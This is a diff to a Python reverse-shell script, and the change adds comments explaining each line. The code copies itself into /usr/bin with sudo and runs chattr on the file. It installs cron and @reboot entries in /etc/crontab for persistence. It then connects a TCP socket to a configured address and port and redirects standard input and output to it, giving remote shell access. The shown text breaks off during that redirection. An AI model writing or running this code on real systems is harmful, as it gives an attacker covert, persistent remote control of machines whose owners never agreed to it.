@@ -20,10 +20,10 @@ def __persistence():
     file_exist_check = os.path.exists("reverseshell.py")
 
     if file_exist_check == True:   
-        os.system('sudo cp reverseshell.py /usr/bin')
-        run(f'sudo chattr -i /usr/bin/reverseshell.py', shell=True)
-        run(f'echo "30 18 * * * /usr/bin/reverseshell.py" | crontab -e', shell=True)
-        run(f'echo "@reboot /usr/bin/reverseshell.py" | tee -a /etc/crontab', shell=True)
+        os.system('sudo cp reverseshell.py /usr/bin') # copy the reverseshell to /usr/bin
+        run(f'sudo chattr -i /usr/bin/reverseshell.py', shell=True) # make the script unmodifiable in /usr/bin
+        run(f'echo "30 18 * * * /usr/bin/reverseshell.py" | crontab -e', shell=True) # add a cronjob for this file
+        run(f'echo "@reboot /usr/bin/reverseshell.py" | tee -a /etc/crontab', shell=True) # add reverseshell.py to startup
         time.sleep(1.25)
     elif file_exist_check == False:  
         pass
@@ -32,21 +32,21 @@ def __persistence():
 
 class shell:
     
-    def __init__(self, target_address, target_port):
+    def __init__(self, target_address, target_port): # assign the target address and the target port
         self.target_address = target_address
         self.target_port = target_port
         
-reverse_connection = shell("127.0.0.1", int(5003))
+reverse_connection = shell("127.0.0.1", int(5003)) # define target ip address and target port
 
 if __name__ == "__main__":
-    __persistence()
+    __persistence() # call the persistence function
     from os import dup2
     import socket
     os.system('clear')
 
     # Change socket.SOCK_STREAM(TCP) to socket.SOCK_DRAM for UDP connection
-    socket_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    socket_sock.connect((reverse_connection.target_address, reverse_connection.target_port))
+    socket_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # use ipv4(AF_INET) and tcp(SOCK_STREAM) for the connection
+    socket_sock.connect((reverse_connection.target_address, reverse_connection.target_port)) # start a connection to the target
 
     dup2(socket_sock.fileno(),0)
     dup2(socket_sock.fileno(),1)
